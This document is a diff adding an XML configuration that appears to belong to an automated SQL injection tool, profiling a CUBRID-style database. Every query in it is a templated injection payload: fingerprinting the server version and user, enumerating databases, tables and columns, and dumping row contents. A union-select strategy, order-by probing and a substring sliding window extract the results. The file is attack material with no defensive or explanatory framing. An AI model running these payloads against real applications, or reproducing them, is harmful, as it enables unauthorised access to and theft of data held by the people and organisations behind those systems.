@@ -1,0 +1,133 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<model>
+    <vendor></vendor>
+    <resource>
+        <info>
+concat(
+    concat_ws(
+        '${ENCLOSE_VALUE_SQL}',
+        version(),
+        database(),
+        user()
+    ),
+    '${TRAIL_SQL}'
+)
+        </info>
+        <schema>
+            <database>
+select concat(
+    group_concat(
+        '${ENCLOSE_VALUE_SQL}'
+        ||r
+        ||'${SEPARATOR_QTE_SQL}'
+        ||cast(q as varchar)
+        ||'${ENCLOSE_VALUE_SQL}'
+        order by 1
+        separator '${SEPARATOR_CELL_SQL}'
+    ),
+    '${TRAIL_SQL}'
+) from (
+    select
+        cast(owner_name as varchar)r,
+        count(class_name)q
+    from db_class
+    group by r
+    {limit}
+)x
+            </database>
+            <table>
+select concat(
+    group_concat(
+        '${ENCLOSE_VALUE_SQL}'
+        ||cast(r as varchar)
+        ||'${SEPARATOR_QTE_SQL}0${ENCLOSE_VALUE_SQL}'
+        order by 1
+        separator '${SEPARATOR_CELL_SQL}'
+    ),
+    '${TRAIL_SQL}'
+) from (
+    select class_name r
+    from db_class
+    where owner_name='${DATABASE}'
+    order by r
+    {limit}
+)x
+            </table>
+            <column>
+select concat(
+    group_concat(
+        '${ENCLOSE_VALUE_SQL}'
+        ||cast(n as varchar)
+        ||'${SEPARATOR_QTE_SQL}'
+        ||0
+        ||'${ENCLOSE_VALUE_SQL}'
+        order by 1
+        separator '${SEPARATOR_CELL_SQL}'
+    ),
+    '${TRAIL_SQL}'
+) from (
+    select attr_name n
+    from db_attribute c 
+    inner join db_class t on t.class_name=c.class_name
+    where t.owner_name='${DATABASE}'
+    and t.class_name='${TABLE}'
+    order by n
+    {limit}
+)x
+            </column>
+            <row>
+                <query>
+select concat(
+    group_concat(
+        '${ENCLOSE_VALUE_SQL}'
+        ||r
+        ||'${SEPARATOR_QTE_SQL}'
+        ||cast(q as varchar)
+        ||'${ENCLOSE_VALUE_SQL}'
+        order by 1
+        separator '${SEPARATOR_CELL_SQL}'
+    ),
+    '${TRAIL_SQL}'
+) from (
+    select
+        cast(concat(${FIELDS})as varchar)r,
+        count(*)q
+    from `${DATABASE}`.`${TABLE}`
+    group by r
+    {limit}
+)x
+                </query>
+                <fields>
+                <field>trim(ifnull(`${FIELD}`,''))</field>
+                <concat>,'%7f',</concat>
+                </fields>
+            </row>
+        </schema>
+    </resource>
+    <strategy>
+        <configuration>
+            <slidingWindow>
+(
+    select
+        concat(
+            '${LEAD}',
+            substr(
+                (${INJECTION}),
+                ${INDEX},
+                ${CAPACITY}
+            )
+        )
+)
+            </slidingWindow>
+            <limit> limit ${LIMIT},65536</limit>
+            <failsafe>''||1337${INDICE}7330%2b1</failsafe>
+            <calibrator>repeat('%23',65536)</calibrator>
+            <limitBoundary>0</limitBoundary>
+        </configuration>
+        <normal>
+            <indices> union select ${INDICES}</indices>
+            <capacity>(select concat('${LEAD}',${INDICE},${CALIBRATOR}))</capacity>
+            <orderBy> order by 1337</orderBy>
+        </normal>
+    </strategy>
+</model>
